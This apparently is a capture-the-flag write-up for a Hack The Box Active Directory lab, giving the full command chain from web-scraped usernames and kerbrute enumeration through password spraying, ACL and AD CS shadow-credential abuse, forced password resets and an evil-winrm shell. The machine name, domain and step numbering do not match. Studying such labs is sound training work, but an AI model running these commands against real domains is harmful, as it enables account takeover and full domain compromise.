## What is this machine

Forest is an Active Directory machine from Hack The Box that focuses on:
- **Kerberos enumeration**
- **Password spraying**
- **BloodHound analysis**
- **ACL / AD CS abuse** to achieve full domain compromise

## Target

```
IP: 10.10.10.1
Domain: infiltrator.htb
DC Hostname: dc01.infiltrator.htb
OS: Windows
```

## Step 1 — Enumeration

### Nmap

```bash
nmap -sC -sV -oA nmap/forest -vv 10.10.10.1
```

## Step 2 — Web Enumeration (User Harvesting)

The website contains an **Employees** section listing names.

Extract usernames from `<h4>` tags:

```bash
curl -s -q 10.10.10.1 | grep -oP 'h4>.[0-9]* \K(.*?)(?=h)'
```

Save the names to `potential_users.txt`.

Generate username permutations:

```bash
username-anarchy -i potential_users.txt
```

📸 **Screenshot to add here:**
- Username extraction

## Step 3 — Kerberos User Enumeration (kerbrute)

Check which users are valid:

```bash
kerbrute userenum --dc 10.10.10.1 -d infiltrator.htb potential_users.txt
```

If hashes are `$18` (AES, not crackable), downgrade:

```bash
kerbrute userenum --dc 10.10.10.1 -d infiltrator.htb --downgrade potential_users.txt
```

If `$23` hashes are returned, crack them with Hashcat.

## Step 4 — Credential Validation & Password Spraying

Validate credentials (e.g., netexec / nxc):

```bash
nxc smb 10.10.10.1 -u l.clark -p whatismypass!
```

List domain users:

```bash
nxc smb 10.10.10.1 -u l.clark -p whatismypass! --users
```

A password for `k.turner` was discovered.

### Password Spraying

Prepare:
* `users.txt`
* `passwords.txt`

Run password spraying:

```bash
nxc smb 10.10.10.1 -u users.txt -p passwords.txt
```

Kerberos-based spraying:

```bash
nxc smb 10.10.10.1 -k -u l.clark -p whatismypass! --continue-on-success
```

If NTLM login is blocked, use Kerberos:

```bash
nxc smb 10.10.10.1 -k -u d.andreson -p whatismypass! --continue-on-success
```

Mark owned users in BloodHound:
* `l.clark`
* `d.andreson`

## Step 7 — ACL Abuse (dacledit.py)

Grant `d.andreson` full control over the OU:

```bash
dacledit.py -action write -rights FullControl -inheritance \
-principal d.andreson \
-target-dn "OU=marketdigital,DC=infiltrator,DC=htb" \
-k -dc-ip dc01.infiltrator.htb \
'infiltrator.htb/d.andreson:whatismypass!'
```

## Step 8 — AD CS Abuse (certipy)

Create shadow credentials for `e.rodrigez`:

```bash
certipy shadow auto -k -target dc01.infiltrator.htb \
-u d.andreson@infiltrator.htb -p "whatismypass!" \
-account e.rodrigez
```

Copy the NT hash.

## Step 9 — Group Membership Abuse & Passwords Reset (bloodyAD)

Add `e.rodrigez` to the marketing group:

```bash
bloodyAD -u e.rodrigez -p ':<hash>' \
--host dc01.infiltrator.htb \
-d infiltrator.htb \
add groupMember "Marketing" e.rodrigez
```

Force password reset for `m.harris`:

```bash
bloodyAD -u e.rodrigez -p ':<hash>' \
--host dc01.infiltrator.htb \
-d infiltrator.htb \
set password m.harris "password!"
```

## Step 10 — Kerberos Ticket Creation & Shell Access

Generate a TGT for `m.harris`:

```bash
getTGT infiltrator.htb/m.harris:password!
```

### Kerberos Configuration

Generate Kerberos config:

```bash
nxc smb infiltrator.htb --generate-krb5-file infiltrator-krb.conf
```

Apply it:

```bash
sudo cp infiltrator-krb.conf /etc/krb5.conf
```

### Shell Access (evil-winrm)

```bash
KRB5CCNAME=m.harris.ccache evil-winrm \
-i dc01.infiltrator.htb \
-r infiltrator.htb
```

Verify privileges:

```powershell
whoami /all
```

## Key Takeaways

**1. Thorough user enumeration is critical**  
Gathering names from public web pages can unlock initial foothold via password spraying.

**2. BloodHound visualizations guide the attack**  
Understanding AD permissions simplifies finding privilege escalation routes.

**3. Overly permissive ACLs are dangerous**  
Having `GenericAll` over an OU easily provides a pathway to fully compromise higher privilege targets within it.
